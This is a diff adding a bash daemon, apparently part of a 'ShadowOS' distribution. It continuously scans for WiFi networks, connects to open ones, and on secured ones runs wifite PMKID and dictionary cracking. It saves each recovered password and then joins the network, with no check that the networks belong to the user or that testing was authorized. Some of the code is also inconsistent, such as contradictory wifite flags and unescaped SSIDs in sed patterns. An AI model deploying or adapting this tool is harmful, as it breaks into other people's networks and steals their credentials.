@@ -1,0 +1,312 @@
+#!/bin/bash
+#
+# shadow-wifi-daemon - ShadowOS WiFi Auto-Connect Daemon
+# /usr/bin/shadow-wifi-daemon
+#
+# Runs in background, continuously scanning and auto-connecting
+# to WiFi networks. Audits secured networks automatically.
+#
+
+set -uo pipefail
+
+VERSION="1.0.0"
+
+# =============================================================================
+# CONFIGURATION
+# =============================================================================
+
+INTERFACE="${SHADOW_WIFI_INTERFACE:-wlan0}"
+WORKDIR="/shadow/wifi"
+WORDLIST="/usr/share/wordlists/shadow-common.txt"
+KNOWN_NETWORKS="/var/lib/shadowos/wifi-credentials.db"
+SCAN_INTERVAL=60
+LOG="/var/log/shadow-wifi.log"
+AUDIT_TIMEOUT=180
+
+# =============================================================================
+# INITIALIZATION
+# =============================================================================
+
+mkdir -p "$WORKDIR" "$(dirname "$KNOWN_NETWORKS")" "$(dirname "$LOG")"
+touch "$KNOWN_NETWORKS" "$LOG"
+chmod 600 "$KNOWN_NETWORKS"
+
+# =============================================================================
+# LOGGING
+# =============================================================================
+
+log() {
+    local msg="[$(date '+%Y-%m-%d %H:%M:%S')] $*"
+    echo "$msg" | tee -a "$LOG"
+}
+
+log_quiet() {
+    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $*" >> "$LOG"
+}
+
+# =============================================================================
+# NETWORK CHECKS
+# =============================================================================
+
+# Check if connected with internet access
+is_connected() {
+    ping -c 1 -W 2 1.1.1.1 &>/dev/null || ping -c 1 -W 2 8.8.8.8 &>/dev/null
+}
+
+# Check if interface exists and is up
+interface_ready() {
+    [[ -d "/sys/class/net/$INTERFACE" ]] && ip link show "$INTERFACE" | grep -q "UP"
+}
+
+# Get current SSID
+current_ssid() {
+    iwgetid -r "$INTERFACE" 2>/dev/null || echo ""
+}
+
+# =============================================================================
+# CREDENTIAL MANAGEMENT
+# =============================================================================
+
+# Try to connect using stored credentials
+connect_known() {
+    local ssid="$1"
+    local pass
+    pass=$(grep "^${ssid}:" "$KNOWN_NETWORKS" 2>/dev/null | cut -d: -f2-)
+    
+    if [[ -n "$pass" ]]; then
+        log "[+] Connecting to known network: $ssid"
+        nmcli dev wifi connect "$ssid" password "$pass" ifname "$INTERFACE" 2>/dev/null && return 0
+        # Fallback to wpa_supplicant
+        wpa_cli -i "$INTERFACE" add_network >/dev/null 2>&1
+        wpa_cli -i "$INTERFACE" set_network 0 ssid "\"$ssid\"" >/dev/null 2>&1
+        wpa_cli -i "$INTERFACE" set_network 0 psk "\"$pass\"" >/dev/null 2>&1
+        wpa_cli -i "$INTERFACE" enable_network 0 >/dev/null 2>&1
+        wpa_cli -i "$INTERFACE" reconnect >/dev/null 2>&1
+        sleep 5
+        return 0
+    fi
+    return 1
+}
+
+# Save credentials
+save_credential() {
+    local ssid="$1"
+    local pass="$2"
+    
+    # Remove old entry if exists
+    sed -i "/^${ssid}:/d" "$KNOWN_NETWORKS" 2>/dev/null
+    echo "${ssid}:${pass}" >> "$KNOWN_NETWORKS"
+    chmod 600 "$KNOWN_NETWORKS"
+    log "[+] Saved credential for: $ssid"
+}
+
+# =============================================================================
+# NETWORK AUDITING
+# =============================================================================
+
+# Quick audit using wifite (PMKID + fast dictionary)
+quick_audit() {
+    local ssid="$1"
+    local bssid="$2"
+    local result_file="$WORKDIR/audit_$(echo "$ssid" | tr ' ' '_').result"
+    
+    log "[*] Auditing: $ssid"
+    
+    # Check if wifite is available
+    if ! command -v wifite &>/dev/null; then
+        log "[!] wifite not installed, skipping audit"
+        return 1
+    fi
+    
+    # Put interface in monitor mode
+    local mon_if="${INTERFACE}mon"
+    airmon-ng check kill 2>/dev/null
+    airmon-ng start "$INTERFACE" 2>/dev/null
+    [[ -d "/sys/class/net/$mon_if" ]] || mon_if="$INTERFACE"
+    
+    # Run wifite in quick mode
+    timeout $AUDIT_TIMEOUT wifite --kill \
+        -i "$mon_if" \
+        --essid "$ssid" \
+        --dict "$WORDLIST" \
+        --pmkid-timeout 60 \
+        --crack \
+        --no-wps \
+        --skip-crack \
+        2>&1 | tee "$result_file"
+    
+    # Restore managed mode
+    airmon-ng stop "$mon_if" 2>/dev/null
+    sleep 2
+    
+    # Try to restart network manager
+    systemctl restart NetworkManager 2>/dev/null || \
+    sv restart networkmanager 2>/dev/null || \
+    /etc/init.d/networking restart 2>/dev/null || true
+    
+    sleep 3
+    
+    # Extract password if found
+    local password
+    password=$(grep -oP 'KEY FOUND! \[\K[^\]]+' "$result_file" 2>/dev/null | head -1)
+    
+    if [[ -n "$password" ]]; then
+        save_credential "$ssid" "$password"
+        log "[+] Password recovered for: $ssid"
+        return 0
+    fi
+    
+    # Try PMKID attack result
+    password=$(grep -oP 'PSK: \K.+' "$result_file" 2>/dev/null | head -1)
+    if [[ -n "$password" ]]; then
+        save_credential "$ssid" "$password"
+        log "[+] Password recovered (PMKID) for: $ssid"
+        return 0
+    fi
+    
+    log "[-] Could not recover password for: $ssid"
+    return 1
+}
+
+# =============================================================================
+# MAIN DAEMON LOOP
+# =============================================================================
+
+main_loop() {
+    log "[*] ═══════════════════════════════════════════════════"
+    log "[*] ShadowOS WiFi Daemon v$VERSION"
+    log "[*] Interface: $INTERFACE"
+    log "[*] Mode: Auto-audit and connect"
+    log "[*] ═══════════════════════════════════════════════════"
+    
+    local last_scan=0
+    local failed_networks=""
+    
+    while true; do
+        # Check if already connected with internet
+        if is_connected; then
+            local ssid
+            ssid=$(current_ssid)
+            log_quiet "[✓] Connected: $ssid"
+            sleep $SCAN_INTERVAL
+            continue
+        fi
+        
+        # Check interface
+        if ! interface_ready; then
+            log "[!] Interface $INTERFACE not ready, waiting..."
+            sleep 10
+            continue
+        fi
+        
+        log "[*] Scanning for networks..."
+        
+        # Get list of available networks sorted by signal strength
+        local networks
+        networks=$(nmcli -t -f SSID,BSSID,SIGNAL,SECURITY dev wifi list ifname "$INTERFACE" 2>/dev/null | \
+                   grep -v '^:' | sort -t: -k3 -rn | head -20)
+        
+        if [[ -z "$networks" ]]; then
+            log "[!] No networks found, retrying..."
+            sleep 30
+            continue
+        fi
+        
+        while IFS=: read -r ssid bssid signal security; do
+            [[ -z "$ssid" ]] && continue
+            
+            # Skip recently failed networks (for 5 minutes)
+            if echo "$failed_networks" | grep -q "^${ssid}:"; then
+                continue
+            fi
+            
+            log "[*] Found: $ssid (${signal}% signal, ${security:-Open})"
+            
+            # Try known credentials first
+            if grep -q "^${ssid}:" "$KNOWN_NETWORKS" 2>/dev/null; then
+                if connect_known "$ssid"; then
+                    sleep 5
+                    if is_connected; then
+                        log "[✓] Connected to: $ssid"
+                        break
+                    fi
+                fi
+            fi
+            
+            # Handle open networks (connect directly)
+            if [[ -z "$security" || "$security" == "--" || "$security" == "" ]]; then
+                log "[*] Open network, connecting: $ssid"
+                nmcli dev wifi connect "$ssid" ifname "$INTERFACE" 2>/dev/null
+                sleep 5
+                if is_connected; then
+                    log "[✓] Connected to open network: $ssid"
+                    break
+                fi
+                continue
+            fi
+            
+            # Audit secured network
+            if quick_audit "$ssid" "$bssid"; then
+                # Try to connect with newly found password
+                if connect_known "$ssid"; then
+                    sleep 5
+                    if is_connected; then
+                        log "[✓] Connected after audit: $ssid"
+                        break
+                    fi
+                fi
+            else
+                # Mark as failed for a while
+                failed_networks="${failed_networks}${ssid}:$(date +%s)\n"
+            fi
+            
+        done <<< "$networks"
+        
+        # Clean old failed entries (older than 5 minutes)
+        local now
+        now=$(date +%s)
+        failed_networks=$(echo -e "$failed_networks" | while IFS=: read -r ssid ts; do
+            [[ -z "$ssid" ]] && continue
+            if [[ $((now - ts)) -lt 300 ]]; then
+                echo "${ssid}:${ts}"
+            fi
+        done)
+        
+        # Wait before next scan cycle
+        sleep $SCAN_INTERVAL
+    done
+}
+
+# =============================================================================
+# SIGNAL HANDLERS
+# =============================================================================
+
+cleanup() {
+    log "[*] Daemon stopping..."
+    # Restore managed mode if we're in monitor
+    airmon-ng stop "${INTERFACE}mon" 2>/dev/null || true
+    exit 0
+}
+
+trap cleanup SIGTERM SIGINT SIGHUP
+
+# =============================================================================
+# MAIN
+# =============================================================================
+
+# Check if running as root
+if [[ $EUID -ne 0 ]]; then
+    echo "[!] This daemon must run as root"
+    exit 1
+fi
+
+# Check for required tools
+for tool in nmcli iwgetid; do
+    if ! command -v "$tool" &>/dev/null; then
+        echo "[!] Required tool not found: $tool"
+        exit 1
+    fi
+done
+
+# Start main loop
+main_loop
